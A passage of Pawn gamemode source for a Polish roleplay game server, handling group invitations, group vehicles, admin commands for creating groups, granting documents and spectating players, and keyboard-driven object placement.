						pVal[playerid] = PlayerCache[playerid][pGroup];
					}
					case 2:
					{
						pVal[playerid] = PlayerCache[playerid][pGroup2];
					}
					case 3:
					{
						pVal[playerid] = PlayerCache[playerid][pGroup3];
					}
				}
				return ShowDialogGroupPanel(playerid);
			}
			else if(!strcmp(sub, "zapros", true))
			{
				/*new guid;
				switch(slot)
				{
					case 1: guid = PlayerCache[playerid][pGroup];
					case 2: guid = PlayerCache[playerid][pGroup2];
					case 3: guid = PlayerCache[playerid][pGroup3];
				}
				if(DoorCache[GetPlayerDoorUID(playerid)][dGroupUID] != guid)
				return ShowDialogInfo(playerid, "Nie znajdujesz siê w budynku grupy.");
				if(!IsPlayerConnected(targetid))
				return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
				if(!pLogged[targetid])
				return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
				new Float:X, Float:Y, Float:Z, pvw = GetPlayerVirtualWorld(playerid); GetPlayerPos(playerid, X, Y, Z);
				if(!IsPlayerInRangeOfPoint(targetid, 5.0, X, Y, Z) || GetPlayerVirtualWorld(targetid) != pvw)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz jest zbyt daleko.");
				new duid = GetPlayerDoorUID(playerid);
				if(IsPlayerInAnyVehicle(playerid))
				{
					new vid = GetPlayerVehicleID(playerid);
					new vuid = GetVehicleUID(vid);
					if( PlayerCache[playerid][pCurrentVehicle][vState] == 2)
					{
						if( PlayerCache[playerid][pCurrentVehicle][vOwner] == guid)
						{

						}
					}
				}
				else if(DoorCache[duid][dGroupUID] != guid && GroupCache[guid][gType] != 0)
				return ShowDialogInfo(playerid, "Nie znajdujesz siê w budynku grupy.");
				switch(slot)
				{
					case 1:
					{
						if(!PlayerCache[playerid][pGroupInvite])
						return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz uprawnieñ do zapraszania.");
					}
					case 2:
					{
						if(!PlayerCache[playerid][pGroupInvite2])
						return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz uprawnieñ do zapraszania.");
					}
					case 3:
					{
						if(!PlayerCache[playerid][pGroupInvite3])
						return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz uprawnieñ do zapraszania.");
					}
				}
				if(PlayerCache[targetid][pGroup] == guid || PlayerCache[targetid][pGroup2] == guid || PlayerCache[targetid][pGroup3] == guid)
				return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nale¿y ju¿ do tej grupy.");
				pVal[targetid] = PlayerCache[playerid][pUID];
				pVal2[targetid] = guid;
				new header[64]; format(header, sizeof(header), "Zaproszenie do grupy %s", GroupCache[guid][gName]);
				new info[256]; format(info, sizeof(info),"Otrzymano zaproszenie do grupy %s przez gracza %s.\nMo¿esz do³¹czyæ do tej grupy wybieraj¹c tak lub nie.\nCzy akceptujesz tê ofertê?",
				GroupCache[guid][gName], RPName(playerid));
				ShowPlayerDialog(targetid, D_JOIN_GROUP, DIALOG_STYLE_MSGBOX, header, info, "Tak", "Nie");
				
				return TextDrawForPlayerEx(playerid, 1, "Oferta ~g~wyslana.", 3000);
			}
			else if(!strcmp(sub, "v", true))
			{
				new guid;
				switch(slot)
				{
					case 1: guid = PlayerCache[playerid][pGroup];
					case 2: guid = PlayerCache[playerid][pGroup2];
					case 3: guid = PlayerCache[playerid][pGroup3];

				}
				new count, list[725], info[128];
				for(new i; i<LastvUID; i++)
				{
					if(VehicleCache[i][vState] == 2)
					{
						if(VehicleCache[i][vOwner] == guid)
						{
							format(info, sizeof(info), ""HEX_WHITE"%d\t%s\n", VehicleCache[i][vUID], GetVehicleName(VehicleCache[i][vModel]), floatround(VehicleCache[i][vHP]));
							if(VehicleCache[i][vID] != 0)
							format(info, sizeof(info), ""HEX_WHITE"%d\t%s*\n", VehicleCache[i][vUID], GetVehicleName(VehicleCache[i][vModel]), floatround(VehicleCache[i][vHP]));
							strins(list, info, strlen(list));
							count++;
						}
					}
				}
				if(count)
				return ShowPlayerDialog(playerid, D_VEHICLES, DIALOG_STYLE_LIST, "Pojazdy grupy (* - zespawnowany)", list, "(Un)Spawn", "Anuluj");
				return ShowDialogInfo(playerid, "Do tej grupy nie zosta³y przypisane jeszcze ¿adne pojazdy.");
			}
			else if(!strcmp(sub, "z", true))
			{
				new guid;
				switch(slot)
				{
					case 1: guid = PlayerCache[playerid][pGroup];
					case 2: guid = PlayerCache[playerid][pGroup2];
					case 3: guid = PlayerCache[playerid][pGroup3];
				}
				new list[1025] = "#\tNadawca\tTreœæ\n", info[64], text[128], count;
				for(new i; i<MAX_APPS; i++)
				{
					if(!AppCache[i][appID])
					break;
					if(AppCache[i][appState] == 0)
					{
						if(AppCache[i][appOwner] == guid)
						{
							format(text, sizeof(text), AppCache[i][appText]);
							if(strlen(text) >= 86)
							{
								strdel(text, 86, strlen(text));
								strins(text, "...", strlen(text));
							}
							format(info, sizeof(info), "%d\t%d\t%s\n", AppCache[i][appID], AppCache[i][appPhone]+50000, text);
							strins(list, info, strlen(list));
							count++;
						}
					}
				}
				PlayerTextDrawHide(playerid, ObjectInfo[playerid]);
				if(!count)
				return ShowDialogInfo(playerid, "Nie znaleziono ¿adnych zg³oszeñ");
				new header[64]; format(header, sizeof(header), "Zg³oszenia grupy %s:", GroupCache[guid][gName]);
				return ShowPlayerDialog(playerid, D_APPS, DIALOG_STYLE_TABLIST_HEADERS, header, list, "Odbierz", "Anuluj");
			}
			return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /g [slot] [opusc] [z] [info] [v] [zapros] [wplac] [wyplac]");
		}
	}
	if(pChoosingTxd[playerid])
	{
		PlayerTextDrawHide(playerid, Group[playerid]);
		PlayerTextDrawHide(playerid, Group2[playerid]);
		PlayerTextDrawHide(playerid, Group3[playerid]);
		PlayerTextDrawHide(playerid, GroupLabel[playerid]);
		pChoosingTxd[playerid]=0;
		CancelSelectTextDraw(playerid);
		return 1;
	}
	new uid = PlayerCache[playerid][pUID];
	new string[128];
	PlayerTextDrawShow(playerid, GroupLabel[playerid]);
	PlayerTextDrawSetString(playerid, Group[playerid], "Brak");
	PlayerTextDrawSetString(playerid, Group2[playerid], "Brak");
	PlayerTextDrawSetString(playerid, Group3[playerid], "Brak");
	if(PlayerCache[uid][pGroup] != 0)
	{
		format(string, sizeof(string), "%s (%d min)", GroupCache[PlayerCache[uid][pGroup]][gName], PlayerCache[uid][pGroupDuty]);
		PlayerTextDrawSetString(playerid, Group[playerid], string);
	}
	if(PlayerCache[uid][pGroup2] != 0)
	{
		format(string, sizeof(string), "%s (%d min)", GroupCache[PlayerCache[uid][pGroup2]][gName], PlayerCache[uid][pGroupDuty2]);
		PlayerTextDrawSetString(playerid, Group2[playerid], string);
	}
	if(PlayerCache[uid][pGroup3] != 0)
	{
		format(string, sizeof(string), "%s (%d min)", GroupCache[PlayerCache[uid][pGroup3]][gName], PlayerCache[uid][pGroupDuty3]);
		PlayerTextDrawSetString(playerid, Group3[playerid], string);
	}
	PlayerTextDrawShow(playerid, Group3[playerid]);
	PlayerTextDrawShow(playerid, Group2[playerid]);
	PlayerTextDrawShow(playerid, Group[playerid]);
	SelectTextDraw(playerid, 0x6088D2FF);
	pChoosingTxd[playerid]=1;*/
	return 1;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	/*new uid = PlayerCache[playerid][pUID];
	if(playertextid == Group[playerid])
	{
		PlayerTextDrawHide(playerid, Group[playerid]);
		PlayerTextDrawHide(playerid, Group2[playerid]);
		PlayerTextDrawHide(playerid, Group3[playerid]);
		PlayerTextDrawHide(playerid, GroupLabel[playerid]);
		CancelSelectTextDraw(playerid);
		if(PlayerCache[uid][pGroup] != 0)
		{
			if(pDuty[playerid] != 0)
			{
				new str[64];
				format(str, sizeof(str), "Schodzisz ze sluzby:~n~~y~%s", GroupCache[pDuty[playerid]][gName]);
				TextDrawForPlayerEx(playerid, 1, str, 5000);
				pDuty[playerid] = 0;
				PlayerTextDrawHide(playerid, DutyTxd[playerid]);
				UpdatePlayerName(playerid);
				if(pGPSTimer[playerid])
				{
					for(new i; i<=GetVehiclePoolSize(); i++)
					{
						DestroyDynamicMapIcon(VehicleMapIcon[i]);
					}
					KillTimer(pGPSTimer[playerid]);
					pGPSTimer[playerid] = 0;
					SendPlayerMe(playerid, "dezaktywuje namierzanie GPS.");
				}
				return 1;
			}
			pDuty[playerid] = GroupCache[PlayerCache[uid][pGroup]][gUID];
			new str[64];
			format(str, sizeof(str), "Wchodzisz na sluzbe:~n~~y~%s", GroupCache[PlayerCache[uid][pGroup]][gName]);
			TextDrawForPlayerEx(playerid, 1, str, 5000);
			format(str, sizeof(str), "Sluzba: ~y~%s", GroupCache[PlayerCache[uid][pGroup]][gName]);
			PlayerTextDrawSetString(playerid, DutyTxd[playerid], str);
			PlayerTextDrawShow(playerid, DutyTxd[playerid]);
			UpdatePlayerName(playerid);
			return 1;
		}
		return 1;
	}
	if(playertextid == Group2[playerid])
	{
		PlayerTextDrawHide(playerid, Group[playerid]);
		PlayerTextDrawHide(playerid, Group2[playerid]);
		PlayerTextDrawHide(playerid, Group3[playerid]);
		PlayerTextDrawHide(playerid, GroupLabel[playerid]);
		CancelSelectTextDraw(playerid);
		if(PlayerCache[uid][pGroup2] != 0)
		{
			if(pDuty[playerid] != 0)
			{
				new str[64];
				format(str, sizeof(str), "Schodzisz ze sluzby:~n~~y~%s", GroupCache[pDuty[playerid]][gName]);
				TextDrawForPlayerEx(playerid, 1, str, 5000);
				PlayerTextDrawHide(playerid, DutyTxd[playerid]);
				pDuty[playerid] = 0;
				UpdatePlayerName(playerid);
				SendPlayerMe(playerid, "dezaktywuje namierzanie GPS.");
				return 1;
			}
			pDuty[playerid] = GroupCache[PlayerCache[uid][pGroup2]][gUID];
			new str[64];
			format(str, sizeof(str), "Wchodzisz na sluzbe:~n~~y~%s", GroupCache[PlayerCache[uid][pGroup2]][gName]);
			TextDrawForPlayerEx(playerid, 1, str, 5000);
			format(str, sizeof(str), "Sluzba: ~y~%s", GroupCache[PlayerCache[uid][pGroup2]][gName]);
			PlayerTextDrawSetString(playerid, DutyTxd[playerid], str);
			PlayerTextDrawShow(playerid, DutyTxd[playerid]);
			UpdatePlayerName(playerid);
			return 1;
		}
		return 1;
	}
	if(playertextid == Group3[playerid])
	{
		PlayerTextDrawHide(playerid, Group[playerid]);
		PlayerTextDrawHide(playerid, Group2[playerid]);
		PlayerTextDrawHide(playerid, Group3[playerid]);
		PlayerTextDrawHide(playerid, GroupLabel[playerid]);
		CancelSelectTextDraw(playerid);
		if(PlayerCache[uid][pGroup3] != 0)
		{	
			if(pDuty[playerid] != 0)
			{
				new str[64];
				format(str, sizeof(str), "Schodzisz ze sluzby:~n~~y~%s", GroupCache[pDuty[playerid]][gName]);
				TextDrawForPlayerEx(playerid, 1, str, 5000);
				PlayerTextDrawHide(playerid, DutyTxd[playerid]);
				pDuty[playerid] = 0;
				UpdatePlayerName(playerid);
				return 1;
			}
			pDuty[playerid] = GroupCache[PlayerCache[uid][pGroup3]][gUID];
			new str[64];
			format(str, sizeof(str), "Wchodzisz na sluzbe:~n~~y~%s", GroupCache[PlayerCache[uid][pGroup3]][gName]);
			TextDrawForPlayerEx(playerid, 1, str, 5000);
			format(str, sizeof(str), "Sluzba: ~y~%s", GroupCache[PlayerCache[uid][pGroup3]][gName]);
			PlayerTextDrawSetString(playerid, DutyTxd[playerid], str);
			PlayerTextDrawShow(playerid, DutyTxd[playerid]);
			UpdatePlayerName(playerid);
			return 1;
		}
		return 1;
	}*/
	return 0;
}

stock LoadGroups()
{
	
	new Cache:cache = mysql_query(DB_HANDLE, "SELECT * FROM groups;");

	new rows = cache_num_rows();
	for(new i=0; i<rows; i++){
		cache_get_value_name_int(i, "gUID", GroupCache[i][gUID]);
		cache_get_value_name_int(i, "gType", GroupCache[i][gType]);
		cache_get_value_name_int(i, "gBank", GroupCache[i][gBank]);
		cache_get_value_name_int(i, "gName", GroupCache[i][gName]);
		cache_get_value_name_int(i, "gChatOOC", GroupCache[i][gChatOOC]);
		cache_get_value_name_int(i, "gChatIC", GroupCache[i][gChatIC]);
		cache_get_value_name_int(i, "gColor", GroupCache[i][gColor]);
		cache_get_value_name_int(i, "gState", GroupCache[i][gState]);
		cache_get_value_name_int(i, "gVehicleLimit", GroupCache[i][gVehicleLimit]);
		cache_get_value_name_int(i, "gPayDay", GroupCache[i][gPayDay]);
	}
	

	printf(">>> Loaded %d groups.", rows);
	cache_delete(cache);
}

CMD:agrupa (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new gtype, gname[128], gcolor[16], limit;
	if(sscanf(params, "is[128]is[128]", gtype, gcolor,limit, gname))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /agrupa [Rodzaj grupy] [Kolor rggb] [limit pojazdów] [Nazwa grupy]");
	if(limit > 20 || limit < 1)
	return SendClientMessage(playerid, COLOR_GRAY, "Limit pojazdów grupowych musi mieœciæ siê pomiêdzy wartoœciami 1-20.");
	CreateGroup(gtype, gname, gcolor, limit);
	new msg[128];
	format(msg, sizeof(msg), "Grupa zosta³a utworzona: %s (UID: %d)", GroupCache[LastgUID-1][gName], GroupCache[LastgUID-1][gUID]);
	return SendClientMessage(playerid, COLOR_GRAY, msg);
}

CMD:adoc (playerid, params[]){
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION){
		return 1;
	}

	new targetid, docType, action[64];
	if(sscanf(params, "iis[64]", targetid, docType, action)){

		SendClientMessage(playerid, COLOR_GRAY, "Tip: /adoc [ID/Nazwa  gracza] [typ: 0-5] [nadaj/zabierz]");
		SendClientMessage(playerid, COLOR_GRAY, "0 - dowód osobisty");
		SendClientMessage(playerid, COLOR_GRAY, "1 - prawo jazdy");
		SendClientMessage(playerid, COLOR_GRAY, "2 - niepoczytalnoœæ");
		SendClientMessage(playerid, COLOR_GRAY, "3 - poczytalnoœæ");
		SendClientMessage(playerid, COLOR_GRAY, "4 - licencja na ³owienie ryb");
		SendClientMessage(playerid, COLOR_GRAY, "5 - niekaralnoœæ");
		return 1;
	} 
	if(docType < 0 || docType > 5){
		SendClientMessage(playerid, COLOR_GRAY, "0 - dowód osobisty");
		SendClientMessage(playerid, COLOR_GRAY, "1 - prawo jazdy");
		SendClientMessage(playerid, COLOR_GRAY, "2 - niepoczytalnoœæ");
		SendClientMessage(playerid, COLOR_GRAY, "3 - poczytalnoœæ");
		SendClientMessage(playerid, COLOR_GRAY, "4 - licencja na ³owienie ryb");
		SendClientMessage(playerid, COLOR_GRAY, "5 - niekaralnoœæ");
		return 1;
	}
	if(pLogged[targetid] == false){
		SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest zalogowany.");
		return 1;
	}
	if(!IsPlayerInRangeOfPlayer(playerid, targetid, 5.0) || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(targetid)){
		SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz jest zbyt daleko.");
		return 1;
	}
	if(!strcmp(action, "nadaj")){
		if(HasPlayerDoc(playerid, docType)){
			SendClientMessage(playerid, COLOR_GRAY, "Gracz posiada ju¿ ten dokument.");
			return 1;
		}
		GivePlayerDoc(targetid, docType);
		TextDrawForPlayerEx(targetid, 1, "Admin nadal Ci nowy dokument postaci.~n~Sprawdz go pod ~y~~h~Stats->Dokumenty", 5000);
		TextDrawForPlayerEx(playerid, 1, "~g~~h~~h~Pomyslnie ~w~nadano dokument dla gracza", 5000);
		return 1;
	}
	else if(!strcmp(action, "zabierz")){
		if(!HasPlayerDoc(playerid, docType)){
			SendClientMessage(playerid, COLOR_GRAY, "Gracz nie posiada takiego dokumentu.");
			return 1;
		}
		
		TextDrawForPlayerEx(targetid, 1, "Admin odebral Twojej postaci pewien dokument.~n~Sprawdz co zniknelo ~y~~h~Stats->Dokumenty", 5000);
		TextDrawForPlayerEx(playerid, 1, "~r~~h~Odebrano dokument graczowi", 5000);
		return 1;
	}
	else{
		SendClientMessage(playerid, COLOR_GRAY, "Tip: U¿yj tylko nadaj/zabierz");
	}
	return 1;
}

CMD:adodaj (playerid, params[])
{
	/*if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new targetid, groupuid;
	if(sscanf(params, "ri", targetid, groupuid))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /adodaj [ID/Czêœæ nazwy gracza] [Grupa UID]");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz nie jest na serwerze lub nie zalogowa³ siê do gry.");
	if(PlayerCache[targetid][pGroup] == 0)
	{
		PlayerCache[targetid][pGroup] = groupuid;
		PlayerCache[targetid][pGroupAdmin] = true;
		return SendClientMessage(playerid, COLOR_GRAY, "Dodano.");
	}
	else if(PlayerCache[targetid][pGroup2] == 0)
	{
		PlayerCache[targetid][pGroup2] = groupuid;
		PlayerCache[targetid][pGroupAdmin2] = true;
		return SendClientMessage(playerid, COLOR_GRAY, "Dodano.");
	}
	else if(PlayerCache[targetid][pGroup3] == 0)
	{
		PlayerCache[targetid][pGroup3] = groupuid;
		PlayerCache[targetid][pGroupAdmin3] = true;
		return SendClientMessage(playerid, COLOR_GRAY, "Dodano.");
	}
	else*/
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie ma wolnych slotów grupowych.");
}

stock AddPlayerToGroup(playerid, groupuid)
{
	if(PlayerCache[playerid][pGroup] == 0)
	{
		PlayerCache[playerid][pGroup] = groupuid;
		return 1;
	}
	else if(PlayerCache[playerid][pGroup2] == 0)
	{
		PlayerCache[playerid][pGroup2] = groupuid;
		return 1;
	}
	else if(PlayerCache[playerid][pGroup3] == 0)
	{
		PlayerCache[playerid][pGroup3] = groupuid;
		return 1;
	}
	return 0;
}

stock HasPlayerFreeSlots(playerid)
{
	new uid = PlayerCache[playerid][pUID];
	if(PlayerCache[uid][pGroup] == 0 || PlayerCache[uid][pGroup2] == 0 || PlayerCache[uid][pGroup3] == 0)
	return 1;
	return 0;
}

stock CreateGroup(grouptype, const gname[], const color[], VehicleLimit)
{
	new name[32]; format(name, sizeof(name), gname);
	GroupCache[LastgUID][gUID] = LastgUID;
	GroupCache[LastgUID][gType] = grouptype;
	GroupCache[LastgUID][gName] = name;
	GroupCache[LastgUID][gChatIC] = false;
	GroupCache[LastgUID][gChatOOC] = false;
	GroupCache[LastgUID][gBank] = 1000;
	new gcolor[16]; format(gcolor, sizeof(gcolor), color);
	GroupCache[LastgUID][gColor] = gcolor;
	GroupCache[LastgUID][gVehicleLimit] = VehicleLimit;
	GroupCache[LastgUID][gPayDay] = 100;
	LastgUID++;
}

stock GetObjectInRange(playerid)
{
	new pvw = GetPlayerVirtualWorld(playerid);
	for(new i; i<MAX_OBJECTS; i++)
	{
		if(ObjectCache[i][oState] == 0)
		{
			if(ObjectCache[i][oVW] == pvw)
			{
				if(IsPlayerInRangeOfPoint(playerid, 2.5, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ]))
				{
					return ObjectCache[i][oID];
				}
			}
		}
	}
	return 0;
}

CMD:rc (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID])
			{
				if(GetPVarInt(i, "Spec") == playerid)
				{
					TogglePlayerSpectating(playerid, 0);
					SetPlayerVirtualWorld(playerid, 0);
					SetPVarInt(i, "Spec", -1);
					return 1;
				}
			}
		}
	}
	new targetid;
	if(sscanf(params, "r", targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /rc [ID/Czêœæ nicku gracza] by podejrzeæ gracza.");
	if(!IsPlayerConnected(targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz jest niezalogowany.");
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID])
			{
				if(i == targetid)
				{
					if(GetPVarInt(i, "Spec") != -1)
					{
						new targetname[64]; format(targetname, sizeof(targetname), strreplace(ReturnPlayerName(GetPVarInt(i, "Spec")), '_', ' '));
						new str[128]; format(str, sizeof(str), "%s podgl¹da ju¿ tego gracza.", targetname);
						return SendClientMessage(playerid, COLOR_GRAY, str);
					}
				}
			}
		}
	}
	TogglePlayerSpectating(playerid, 1);
	SetPVarInt(targetid, "Spec", playerid);
	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(targetid));
	if(IsPlayerInAnyVehicle(targetid))
	{
		return PlayerSpectateVehicle(playerid, GetPlayerVehicleID(targetid));
	}
	PlayerSpectatePlayer(playerid, targetid);
	return 1;
}

/*public OnPlayerEditDynamicObject(playerid, STREAMER_TAG_OBJECT objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new objectuid = GetObjectUID(objectid);
	if(response == EDIT_RESPONSE_CANCEL)
	{
		DestroyDynamicObject(objectid);
		ObjectCache[objectuid][oPlayer] = -1;
		ObjectCache[objectuid][oID] = 0;
		ObjectCache[objectuid][oState] = 1;
		PlayerTextDrawHide(playerid, ObjectInfo[playerid]);
	}
	if(response == EDIT_RESPONSE_FINAL)
	{
		ObjectCache[objectuid][oX] = x;
		ObjectCache[objectuid][oY] = y;
		ObjectCache[objectuid][oZ] = z;
		ObjectCache[objectuid][orX] = rx;
		ObjectCache[objectuid][orY] = ry;
		ObjectCache[objectuid][orZ] = rz;
		ObjectCache[objectuid][oPlayer] = -1;
		PlayerTextDrawHide(playerid, ObjectInfo[playerid]);
	}
	if(response == EDIT_RESPONSE_UPDATE)
	{
		ObjectCache[objectuid][oX] = x;
		ObjectCache[objectuid][oY] = y;
		ObjectCache[objectuid][oZ] = z;
		ObjectCache[objectuid][orX] = rx;
		ObjectCache[objectuid][orY] = ry;
		ObjectCache[objectuid][orZ] = rz;
		ObjectCache[objectuid][oPlayer] = -1;
		new str[256];
		format(str, sizeof(str), "Pozycja: ~b~~h~~h~%f, %f, %f~n~~w~Rotacja: ~b~~h~~h~%f, %f, %f~w~~n~Obiekt: ~b~~h~~h~%d ~w~UID: ~b~~h~~h~%d", ObjectCache[objectuid][oX], ObjectCache[objectuid][oY], ObjectCache[objectuid][oZ], ObjectCache[objectuid][orX], ObjectCache[objectuid][orY],
		ObjectCache[objectuid][orZ], ObjectCache[objectuid][oModel], objectuid);
		PlayerTextDrawSetString(playerid, ObjectInfo[playerid], str);
		PlayerTextDrawShow(playerid, ObjectInfo[playerid]);
	}
}*/



new gindex[MAX_PLAYERS], globallib[MAX_PLAYERS][32], globalname[MAX_PLAYERS][32];
new gstr[MAX_PLAYERS][256];

forward ObjectMoving(playerid);
public ObjectMoving(playerid)
{
	gindex[playerid] = GetPlayerAnimationIndex(playerid);
	GetAnimationName(gindex[playerid], globallib[playerid],32, globalname[playerid],32);

	if(!strcmp(globallib[playerid], "swat", true))
	{
		GetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);
		GetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]);

		new keys, ud, lr;
		GetPlayerKeys(playerid,keys, ud, lr);

		if(keys & KEY_JUMP && ud == KEY_UP && keys & KEY_SPRINT)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]+1);
		else if(keys & KEY_JUMP && ud == KEY_DOWN && keys & KEY_SPRINT)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]-1);
		else if(keys & KEY_JUMP && lr == KEY_LEFT && keys & KEY_SPRINT)
		SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]+10);
		else if(keys & KEY_JUMP && lr == KEY_RIGHT && keys & KEY_SPRINT)
		SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]-10);
		else if(ud == KEY_UP && keys & KEY_SPRINT)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY]+1, ObjectCache[playerid][oZ]);
		else if(ud == KEY_DOWN && keys & KEY_SPRINT)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY]-1, ObjectCache[playerid][oZ]);
		else if(lr == KEY_RIGHT && keys & KEY_SPRINT)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX]+1, ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);
		else if(lr == KEY_LEFT && keys & KEY_SPRINT)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX]-1, ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);
		else if(keys & KEY_JUMP && ud == KEY_UP && keys & KEY_WALK)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]+0.01);
		else if(keys & KEY_JUMP && ud == KEY_DOWN && keys & KEY_WALK)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]-0.01);
		else if(keys & KEY_JUMP && lr == KEY_LEFT && keys & KEY_WALK)
		SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]+0.1);
		else if(keys & KEY_JUMP && lr == KEY_RIGHT && keys & KEY_WALK)
		SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]-0.1);
		else if(ud == KEY_UP && keys & KEY_WALK)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY]+0.01, ObjectCache[playerid][oZ]);
		else if(ud == KEY_DOWN && keys & KEY_WALK)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY]-0.01, ObjectCache[playerid][oZ]);
		else if(lr == KEY_RIGHT && keys & KEY_WALK)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX]+0.01, ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);
		else if(lr == KEY_LEFT && keys & KEY_WALK)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX]-0.01, ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);
		else if(keys & KEY_JUMP && ud == KEY_UP)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]+0.10);
		else if(keys & KEY_JUMP && ud == KEY_DOWN)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ]-0.10);
		else if(keys & KEY_JUMP && lr == KEY_LEFT)
		SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]+1);
		else if(keys & KEY_JUMP && lr == KEY_RIGHT)
		SetDynamicObjectRot(ObjectCache[playerid][oID], ObjectCache[playerid][orX], ObjectCache[playerid][orY], ObjectCache[playerid][orZ]-1);
		else if(ud == KEY_UP)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY]+0.10, ObjectCache[playerid][oZ]);
		else if(ud == KEY_DOWN)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX], ObjectCache[playerid][oY]-0.10, ObjectCache[playerid][oZ]);
		else if(lr == KEY_RIGHT)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX]+0.10, ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);
		else if(lr == KEY_LEFT)
		SetDynamicObjectPos(ObjectCache[playerid][oID], ObjectCache[playerid][oX]-0.10, ObjectCache[playerid][oY], ObjectCache[playerid][oZ]);

		format(gstr[playerid], 256, "~w~Pozycja: ~y~%f, %f, %f~n~~w~Rotacja: ~y~%f, %f, %f",
		ObjectCache[playerid][oX], ObjectCache[playerid][oY], ObjectCache[playerid][oZ], ObjectCache[playerid][orX],
		ObjectCache[playerid][orY], ObjectCache[playerid][orZ]);
		PlayerTextDrawSetString(playerid, ObjectInfo[playerid], gstr[playerid]);
		PlayerTextDrawShow(playerid, ObjectInfo[playerid]);
	}
}

CMD:mc (playerid, params[])
{
	/*if(GetPlayerVirtualWorld(playerid) == 0)
	{
		if(!PlayerCache[playerid][pLevel])
		return GameTextForPlayer(playerid, "~r~~h~brak uprawnien", 3000, 4);
	}
	new str[1024];
	format(str, sizeof(str), "SELECT playerUID, groupUID FROM doors WHERE uid = '%d' LIMIT 1", pPickupUID[playerid]);
	new Cache:cache = mysql_query(DB_HANDLE, str);

	new playerUID, groupUID;
	cache_get_value_name_int(0, "playerUID", playerUID);
	cache_get_value_name_int(0, "groupUID", groupUID);
	cache_delete(cache);

	if(playerUID)
		{
			if(PlayerCache[playerid][pUID] != playerUID)
			return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
		}
